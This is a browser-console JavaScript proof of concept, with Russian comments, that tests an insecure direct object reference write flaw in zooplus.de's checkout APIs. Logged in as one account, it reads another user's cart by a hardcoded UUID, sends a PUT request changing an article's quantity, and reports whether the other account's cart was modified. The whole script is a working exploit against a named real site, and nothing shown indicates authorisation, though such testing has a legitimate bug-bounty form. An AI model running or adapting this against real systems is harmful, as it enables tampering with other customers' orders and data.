// Проверка изменения autoshipment/subscription
// Выполните в консоли браузера под Account B

const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";

(async function() {
  console.log("[*] ========================================");
  console.log("[*] CHECKING AUTOSHIPMENT/SUBSCRIPTION CHANGE");
  console.log("[*] ========================================");
  
  // Получить корзину ДО
  const cartBefore = await fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: 'include'
  }).then(r => r.json());
  
  console.log("\n[+] Cart BEFORE modification:");
  console.log(`    Items: ${cartBefore.articles.length}`);
  console.log(`    Total: ${cartBefore.summary.grandTotal} EUR`);
  console.log(`    Articles details:`);
  cartBefore.articles.forEach((a, i) => {
    console.log(`      ${i+1}. ID: ${a.id}, Name: ${a.name}, Qty: ${a.quantity}, Price: ${a.subTotal} EUR`);
    console.log(`         Autoshipment: ${a.autoshipmentSelected}, SavingsPlan: ${a.savingsPlanArticle}`);
  });
  console.log(`    Cart Autoshipment:`, JSON.stringify(cartBefore.cartAutoshipment, null, 2));
  
  // Выполнить PUT запрос
  const articleId = cartBefore.articles.find(a => a.id === 2966422)?.id || cartBefore.articles[0]?.id;
  console.log(`\n[*] Modifying article ${articleId} quantity to 2...`);
  
  const response = await fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/set-article-quantity`, {
    method: "PUT",
    credentials: "include",
    headers: {
      "Content-Type": "application/json",
      "Accept": "application/json"
    },
    body: JSON.stringify({
      articleId: articleId,
      quantity: 2
    })
  });
  
  const responseText = await response.text();
  console.log(`[+] PUT Response: HTTP ${response.status}`);
  if (response.status === 200) {
    try {
      const json = JSON.parse(responseText);
      console.log(`[+] Response JSON:`, JSON.stringify(json, null, 2).substring(0, 500));
    } catch(e) {
      console.log(`[+] Response text: ${responseText.substring(0, 500)}`);
    }
  }
  
  // Подождать 3 секунды
  console.log(`\n[*] Waiting 3 seconds for sync...`);
  await new Promise(resolve => setTimeout(resolve, 3000));
  
  // Получить корзину ПОСЛЕ
  const cartAfter = await fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: 'include'
  }).then(r => r.json());
  
  console.log("\n[+] Cart AFTER modification:");
  console.log(`    Items: ${cartAfter.articles.length}`);
  console.log(`    Total: ${cartAfter.summary.grandTotal} EUR`);
  console.log(`    Articles details:`);
  cartAfter.articles.forEach((a, i) => {
    console.log(`      ${i+1}. ID: ${a.id}, Name: ${a.name}, Qty: ${a.quantity}, Price: ${a.subTotal} EUR`);
    console.log(`         Autoshipment: ${a.autoshipmentSelected}, SavingsPlan: ${a.savingsPlanArticle}`);
  });
  console.log(`    Cart Autoshipment:`, JSON.stringify(cartAfter.cartAutoshipment, null, 2));
  
  // Сравнить
  console.log("\n[*] ========================================");
  console.log("[*] COMPARISON");
  console.log("[*] ========================================");
  console.log(`    Items count: ${cartBefore.articles.length} → ${cartAfter.articles.length}`);
  console.log(`    Total: ${cartBefore.summary.grandTotal} EUR → ${cartAfter.summary.grandTotal} EUR`);
  
  // Проверить каждую статью
  cartBefore.articles.forEach((article, i) => {
    const afterArticle = cartAfter.articles.find(a => a.id === article.id);
    if (afterArticle) {
      const qtyChanged = article.quantity !== afterArticle.quantity;
      const priceChanged = Math.abs(article.subTotal - afterArticle.subTotal) > 0.01;
      const autoshipChanged = article.autoshipmentSelected !== afterArticle.autoshipmentSelected;
      
      if (qtyChanged || priceChanged || autoshipChanged) {
        console.log(`\n    [!!!] Article ${article.id} CHANGED:`);
        if (qtyChanged) console.log(`      Quantity: ${article.quantity} → ${afterArticle.quantity} ✅`);
        if (priceChanged) console.log(`      Price: ${article.subTotal} → ${afterArticle.subTotal} EUR ✅`);
        if (autoshipChanged) console.log(`      Autoshipment: ${article.autoshipmentSelected} → ${afterArticle.autoshipmentSelected} ✅`);
      } else {
        console.log(`    Article ${article.id}: No change`);
      }
    }
  });
  
  // Проверить autoshipment
  if (JSON.stringify(cartBefore.cartAutoshipment) !== JSON.stringify(cartAfter.cartAutoshipment)) {
    console.log(`\n    [!!!] Cart Autoshipment CHANGED! ✅`);
    console.log(`    Before:`, JSON.stringify(cartBefore.cartAutoshipment, null, 2));
    console.log(`    After:`, JSON.stringify(cartAfter.cartAutoshipment, null, 2));
  }
  
  // Итог
  const totalChanged = Math.abs(cartAfter.summary.grandTotal - cartBefore.summary.grandTotal) > 0.01;
  const itemsChanged = cartAfter.articles.length !== cartBefore.articles.length;
  const anyArticleChanged = cartBefore.articles.some((a, i) => {
    const after = cartAfter.articles.find(aa => aa.id === a.id);
    return after && (a.quantity !== after.quantity || Math.abs(a.subTotal - after.subTotal) > 0.01);
  });
  
  if (totalChanged || itemsChanged || anyArticleChanged) {
    console.log("\n[!!!] ========================================");
    console.log("[!!!] CRITICAL IDOR WRITE CONFIRMED!");
    console.log("[!!!] ========================================");
    console.log(`[!!!] Account B successfully modified Account A's cart!`);
  } else {
    console.log("\n[!] Cart unchanged in API response");
    console.log("[!] But page shows change - possible UI-only update or different data source");
  }
})();

